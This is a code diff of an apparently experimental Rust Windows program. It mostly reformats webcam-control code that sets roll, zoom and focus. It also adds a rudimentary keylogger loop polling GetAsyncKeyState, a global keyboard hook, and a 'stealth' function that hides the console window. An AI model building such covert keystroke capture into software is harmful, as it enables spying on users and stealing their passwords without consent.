@@ -4,7 +4,11 @@ use windows::{
     core::{ComInterface, Interface, GUID, PCWSTR},
     Win32::{
         Media::{
-            DirectShow::{IAMCameraControl, IBaseFilter, ICreateDevEnum, CameraControl_Focus, CameraControl_Zoom, CameraControl_Roll, CameraControl_Flags_Manual, CameraControlFlags},
+            DirectShow::{
+                CameraControlFlags, CameraControl_Flags_Manual, CameraControl_Focus,
+                CameraControl_Roll, CameraControl_Zoom, IAMCameraControl, IBaseFilter,
+                ICreateDevEnum,
+            },
             MediaFoundation::{CLSID_SystemDeviceEnum, CLSID_VideoInputDeviceCategory},
         },
         System::{
@@ -20,24 +24,118 @@ use windows::{
 use crate::consts::camctl::*;
 use crate::consts::guids::*;
 
-
 fn main() {
-    windows_1();
+    // windows_1();
+    keys2::keys_2();
+}
+
+mod keys2 {
+    // extern crate user32;
+    // extern crate kernel32;
+
+    use std::fs::{File, OpenOptions};
+    use std::io::prelude::*;
+
+    #[allow(unused_variables)]
+    pub fn keys_2() {
+        //stealth();
+        println!("### GO #############");
+
+        loop {
+            for i in 8..190 {
+                if unsafe { winapi::um::winuser::GetAsyncKeyState(i) } == -32767 {
+                    // let key: String = match i as u32 {
+                    //     32 => " ".into(),
+                    //     8 => "[Backspace]".into(),
+                    //     13 => "\n".into(),
+                    //     winapi::VK_TAB => "[TAB]".into(),
+                    //     winapi::VK_SHIFT => "[SHIFT]".into(),
+                    //     winapi::VK_CONTROL => "[CTRL]".into(),
+                    //     winapi::VK_ESCAPE => "[ESCAPE]".into(),
+                    //     winapi::VK_END => "[END]".into(),
+                    //     winapi::VK_HOME => "[HOME]".into(),
+                    //     winapi::VK_LEFT => "[LEFT]".into(),
+                    //     winapi::VK_UP => "[UP]".into(),
+                    //     winapi::VK_RIGHT => "[RIGHT]".into(),
+                    //     winapi::VK_DOWN => "[DOWN]".into(),
+                    //     190 | 110 => ".".into(),
+                    //     _ => (i as u8 as char).to_string(),
+                    // };
+                    // write!(&mut file, "{}", key).unwrap();
+                    println!("Key: {:?}", i);
+                }
+            }
+
+            unsafe {
+                kernel32::SleepEx(1, 1);
+            }
+        }
+        println!("### END ###########");
+    }
+
+    fn stealth() {
+        let mut stealth: winapi::shared::windef::HWND;
+        unsafe {
+            kernel32::AllocConsole();
+            stealth = winapi::um::winuser::FindWindowA(
+                std::ffi::CString::new("ConsoleWindowClass")
+                    .unwrap()
+                    .as_ptr(),
+                std::ptr::null(),
+            );
+            winapi::um::winuser::ShowWindow(stealth, 0);
+        }
+    }
+}
+
+use hookmap_core::{button::Button, event::Event, mouse};
+fn keys_1() {
+    let rx = hookmap_core::install_hook();
+
+    while let Ok((event, native_handler)) = rx.recv() {
+        match event {
+            Event::Button(event) => {
+                native_handler.dispatch();
+
+                println!("target: {:?}", event.target);
+
+                match event.target {
+                    Button::RightArrow => println!("Left"),
+                    Button::UpArrow => println!("Up"),
+                    Button::LeftArrow => println!("Right"),
+                    Button::DownArrow => println!("Down"),
+                    _ => {}
+                };
+            }
+
+            Event::Cursor(e) => {
+                // native_handler.block();
+
+                // // Reverses mouse cursor movement
+                // let (dx, dy) = e.delta;
+                // mouse::move_relative(-dx, -dy);
+            }
+
+            Event::Wheel(e) => {
+                native_handler.dispatch();
+                println!("delta: {}", e.delta);
+            }
+        }
+    }
 }
 
 fn windows_1() {
     unsafe {
         CoInitializeEx(None, COINIT_MULTITHREADED).expect("initialization");
 
-        
         // Get ICreateDevEnum instance
-        // 
+        //
         let enum_dev: ICreateDevEnum =
             CoCreateInstance(&CLSID_SystemDeviceEnum, None, CLSCTX_ALL).expect("devEnum"); // works
         println!("enum_dev: {:?}", enum_dev);
 
         // Query for VideoInputDevices
-        // 
+        //
         let mut class_enumerator: Option<IEnumMoniker> = None;
         enum_dev
             .CreateClassEnumerator(&CLSID_VideoInputDeviceCategory, &mut class_enumerator, 0)
@@ -53,10 +151,9 @@ fn windows_1() {
         let mut monikers: Vec<Option<IMoniker>> = Vec::new();
         monikers.push(None);
 
-        
         // walk through results, but maximum 10 items...
         // ...and print out their stuff
-        // 
+        //
         let celt: Option<*mut u32> = None;
         for n in 0..10 {
             let hr = enum_moniker.Next(&mut monikers, celt);
@@ -68,10 +165,10 @@ fn windows_1() {
                     println!("[{n}] found: {:?}", current);
 
                     let _bind_ctx = CreateBindCtx(0).expect("bindctx");
-                    
+
                     let m = current.as_ref().unwrap();
                     println!(" --> m: {:?}", m);
-                    
+
                     // ### PropertyBag ###########################################################################################################################################
                     let mut result__ = ::std::ptr::null_mut();
                     let hr = m.BindToStorage(None, None, &P_BAG, &mut result__);
@@ -105,14 +202,18 @@ fn windows_1() {
                     // ### IBaseFilter ##########################################################################################################################################
                     let hr = m.BindToObject(None, None, &BF, &mut result__);
                     println!(" --> IBaseFilter: {:?}  --  result__: {:?}", hr, result__);
-                    
+
                     // ###################################################################################################################################################
                     let hr = m.BindToObject(None, None, &IAMCC, &mut result__);
-                    println!(" --> IAMCameraControl: {:?}  --  result__: {:?}", hr, result__);
+                    println!(
+                        " --> IAMCameraControl: {:?}  --  result__: {:?}",
+                        hr, result__
+                    );
                     if hr.is_ok() {
-                        let camctl: IAMCameraControl = IAMCameraControl::from_raw(result__.as_mut().unwrap());
+                        let camctl: IAMCameraControl =
+                            IAMCameraControl::from_raw(result__.as_mut().unwrap());
                         println!("   - camctl: {:?}", camctl);
-                        
+
                         // ### READ PROPERTIES (currently not working: (Err(Error { code: HRESULT(0x80070057), message: "The parameter is incorrect." })))
                         let mut val: i32 = 0;
                         let _val = &mut val as *mut i32;
@@ -122,59 +223,84 @@ fn windows_1() {
                         let mut flags = CameraControlFlags::default();
                         let _flags = &mut flags.0 as *mut i32;
                         let res = camctl.Get(prop, _val, _flags);
-                        println!("     - camctl.get({}): val={:?}, flags={:?} ({:?})", prop, val, *_flags, res);
+                        println!(
+                            "     - camctl.get({}): val={:?}, flags={:?} ({:?})",
+                            prop, val, *_flags, res
+                        );
 
                         // ### WRITE PROPERTIES
-                       
+
                         // ROLL
                         let prop = CameraControl_Roll.0;
                         let val = 1;
                         let flags = 0;
-                        let res = camctl.Set(CameraControl_Roll.0, 1, 0);  // WORKS!!!!!
-                        println!("     - camctl.set({}): val={:?}, flags={:?} ({:?})", CameraControl_Roll.0, val, flags, res);
-                            thread::sleep(time::Duration::from_millis(250));
-                            // ROLL BACK
-                            let prop = CameraControl_Roll.0;
-                            let val = 1;
-                            let flags = 0;
-                            let res = camctl.Set(CameraControl_Roll.0, 2, 0);  // WORKS!!!!!
-                            println!("     - camctl.set({}): val={:?}, flags={:?} ({:?})", CameraControl_Roll.0, val, flags, res);
-                            thread::sleep(time::Duration::from_millis(250));
-                            // ROLL BACK
-                            let prop = CameraControl_Roll.0;
-                            let val = 1;
-                            let flags = 0;
-                            let res = camctl.Set(CameraControl_Roll.0, 3, 0);  // WORKS!!!!!
-                            println!("     - camctl.set({}): val={:?}, flags={:?} ({:?})", CameraControl_Roll.0, val, flags, res);
-                            thread::sleep(time::Duration::from_millis(250));
-                            // ROLL BACK
-                            let prop = CameraControl_Roll.0;
-                            let val = 1;
-                            let flags = 0;
-                            let res = camctl.Set(CameraControl_Roll.0, 0, 0);  // WORKS!!!!!
-                            println!("     - camctl.set({}): val={:?}, flags={:?} ({:?})", CameraControl_Roll.0, val, flags, res);
-                            thread::sleep(time::Duration::from_millis(500));
+                        let res = camctl.Set(CameraControl_Roll.0, 1, 0); // WORKS!!!!!
+                        println!(
+                            "     - camctl.set({}): val={:?}, flags={:?} ({:?})",
+                            CameraControl_Roll.0, val, flags, res
+                        );
+                        thread::sleep(time::Duration::from_millis(250));
+                        // ROLL BACK
+                        let prop = CameraControl_Roll.0;
+                        let val = 1;
+                        let flags = 0;
+                        let res = camctl.Set(CameraControl_Roll.0, 2, 0); // WORKS!!!!!
+                        println!(
+                            "     - camctl.set({}): val={:?}, flags={:?} ({:?})",
+                            CameraControl_Roll.0, val, flags, res
+                        );
+                        thread::sleep(time::Duration::from_millis(250));
+                        // ROLL BACK
+                        let prop = CameraControl_Roll.0;
+                        let val = 1;
+                        let flags = 0;
+                        let res = camctl.Set(CameraControl_Roll.0, 3, 0); // WORKS!!!!!
+                        println!(
+                            "     - camctl.set({}): val={:?}, flags={:?} ({:?})",
+                            CameraControl_Roll.0, val, flags, res
+                        );
+                        thread::sleep(time::Duration::from_millis(250));
+                        // ROLL BACK
+                        let prop = CameraControl_Roll.0;
+                        let val = 1;
+                        let flags = 0;
+                        let res = camctl.Set(CameraControl_Roll.0, 0, 0); // WORKS!!!!!
+                        println!(
+                            "     - camctl.set({}): val={:?}, flags={:?} ({:?})",
+                            CameraControl_Roll.0, val, flags, res
+                        );
+                        thread::sleep(time::Duration::from_millis(500));
 
                         // ZOOM
                         let prop = CameraControl_Zoom.0;
                         let val = 1;
                         let flags = 0;
-                        let res = camctl.Set(CameraControl_Zoom.0, 120, 0);  // 100 .. 400 WORKS!!!!
-                        println!("     - camctl.set({}): val={:?}, flags={:?} ({:?})", CameraControl_Zoom.0, val, flags, res);
-                            thread::sleep(time::Duration::from_millis(250));
-                            // ZOOM BACK
-                            let prop = CameraControl_Roll.0;
-                            let val = 1;
-                            let flags = 0;
-                            let res = camctl.Set(CameraControl_Zoom.0, 100, 0);  // WORKS!!!!!
-                            println!("     - camctl.set({}): val={:?}, flags={:?} ({:?})", CameraControl_Zoom.0, val, flags, res);
-                        
+                        let res = camctl.Set(CameraControl_Zoom.0, 120, 0); // 100 .. 400 WORKS!!!!
+                        println!(
+                            "     - camctl.set({}): val={:?}, flags={:?} ({:?})",
+                            CameraControl_Zoom.0, val, flags, res
+                        );
+                        thread::sleep(time::Duration::from_millis(250));
+                        // ZOOM BACK
+                        let prop = CameraControl_Roll.0;
+                        let val = 1;
+                        let flags = 0;
+                        let res = camctl.Set(CameraControl_Zoom.0, 100, 0); // WORKS!!!!!
+                        println!(
+                            "     - camctl.set({}): val={:?}, flags={:?} ({:?})",
+                            CameraControl_Zoom.0, val, flags, res
+                        );
+
                         // FOCUS
                         let prop = CameraControl_Focus.0;
                         let val = 1;
                         let flags = 0;
-                        let res = camctl.Set(CameraControl_Focus.0, CameraControl_Flags_Manual.0, 0);  // will probably work...
-                        println!("     - camctl.set({}): val={:?}, flags={:?} ({:?})", CameraControl_Focus.0, val, flags, res);
+                        let res =
+                            camctl.Set(CameraControl_Focus.0, CameraControl_Flags_Manual.0, 0); // will probably work...
+                        println!(
+                            "     - camctl.set({}): val={:?}, flags={:?} ({:?})",
+                            CameraControl_Focus.0, val, flags, res
+                        );
                     }
                 }
                 1 => {
@@ -204,15 +330,20 @@ mod consts {
         pub const IAMCameraControl_FLAG_FOCUS_AUTO: i32 = 0x0001;
         pub const IAMCameraControl_FLAG_FOCUS_MANUAL: i32 = 0x0002;
     }
-    
+
     pub mod guids {
-        use windows::{Win32::{System::Com::StructuredStorage::IPropertyBag, Media::DirectShow::{IBaseFilter, IAMCameraControl}}, core::{ComInterface, GUID}};
+        use windows::{
+            core::{ComInterface, GUID},
+            Win32::{
+                Media::DirectShow::{IAMCameraControl, IBaseFilter},
+                System::Com::StructuredStorage::IPropertyBag,
+            },
+        };
         pub const P_BAG: GUID = IPropertyBag::IID;
         pub const BF: GUID = IBaseFilter::IID;
         pub const IAMCC: GUID = IAMCameraControl::IID;
     }
 }
-
 
 // LINKS
 // https://www.appsloveworld.com/cplus/100/66/how-to-get-a-list-of-video-capture-devices-web-cameras-on-windows-c
